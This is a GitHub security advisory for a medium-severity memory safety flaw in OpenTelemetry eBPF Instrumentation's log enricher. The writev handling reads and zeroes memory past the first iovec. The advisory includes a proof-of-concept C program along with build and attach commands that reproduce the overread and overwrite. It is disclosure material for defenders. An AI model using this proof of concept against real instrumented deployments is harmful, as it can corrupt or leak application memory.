# [M] OpenTelemetry eBPF Instrumentation: Log enricher writev path can overread and overwrite user buffers

## Summary
Severity: Medium
Advisory: GHSA-vvmg-8mjr-g6q3
CVE: CVE-2026-45684
CWE: CWE-126, CWE-787
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-vvmg-8mjr-g6q3
Type: github-advisory

## Affected
- Go: `go.opentelemetry.io/obi` — affected >=0.7.0 <0.9.0

## Details
### Summary

OBI's log enricher mishandles `writev` buffers by reading only the first `iovec` entry but using the total `iov_iter.count` as the copy length. When log injection is enabled, a crafted multi-segment `writev` call can make OBI read and overwrite memory beyond the first segment.

### Details

In [bpf/logenricher/logenricher.c#L50](https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/blob/360521f411213566a3b557a1f0c093e6cd68a4de/bpf/logenricher/logenricher.c#L50), `__fill_iov` resolves only one `struct iovec`, specifically `iov_ctx.iov[0]` for `ITER_IOVEC`. The returned `iov` therefore describes only the first write segment.

However, `__write` later uses `const size_t count = BPF_CORE_READ(from, count);`, which is the total byte count across all segments in the iterator. That total is stored in `e->len` and used in `bpf_probe_read_user(e->log, e->len, iov.iov_base)` and `bpf_probe_write_user(iov.iov_base, zero, to_write)`.

If `count` exceeds `iov.iov_len`, OBI reads and then zeroes memory past the end of the first segment. In practice, this can corrupt adjacent application buffers, leak memory into log events, and in some layouts destabilize the instrumented process.

### PoC

Local testing with a minimal ASan harness reproduced the same out-of-bounds read/write condition as the vulnerable `writev` path.

Use a vulnerable build with the log enricher enabled.

```bash
git checkout v0.7.0
make build
```

Create a program that performs a two-element `writev`, where the first buffer is short and the second is large:

```c
// save as /tmp/writev-poc.c
#define _GNU_SOURCE
#include <sys/uio.h>
#include <unistd.h>
#include <string.h>

int main(void) {
  char a[8] = "HELLO\n";
  char b[256];
  memset(b, 'B', sizeof(b));

  struct iovec iov[2];
  iov[0].iov_base = a;
  iov[0].iov_len = sizeof(a);
  iov[1].iov_base = b;
  iov[1].iov_len = sizeof(b);

  for (;;) {
    writev(1, iov, 2);
    usleep(10000);
  }
}
```

Compile and run it:

```bash
cc -O2 -o /tmp/writev-poc /tmp/writev-poc.c
/tmp/writev-poc >/dev/null
```

Attach OBI with log enrichment enabled to the running process:

```bash
PID=$(pgrep -f /tmp/writev-poc)
sudo ./bin/obi --pid "$PID"
```

On a vulnerable build, OBI copies `iov_iter.count` bytes starting from `iov[0].iov_base`, even though `iov[0]` is only 8 bytes long. Depending on allocator layout, you will see one of the following:

1. log events that include bytes beyond `HELLO\n`
2. corrupted stdout content because OBI zeroed memory beyond the first iovec
3. process instability or a crash

The issue is easiest to observe under a debugger or with ASan-enabled builds of the target program, but those are not required.

### Impact

This is a memory safety flaw in the log-enrichment eBPF path. It affects deployments that enable log injection and instrument applications that write logs through `writev`. An attacker who can trigger the vulnerable local `writev` pattern inside the instrumented process can cause memory corruption or disclosure in that process. The most direct effects are corrupted output and adjacent-memory disclosure, with process instability possible if the overwrite lands on sensitive state.

## References
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/security/advisories/GHSA-vvmg-8mjr-g6q3
- https://nvd.nist.gov/vuln/detail/CVE-2026-45684
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/releases/tag/v0.9.0
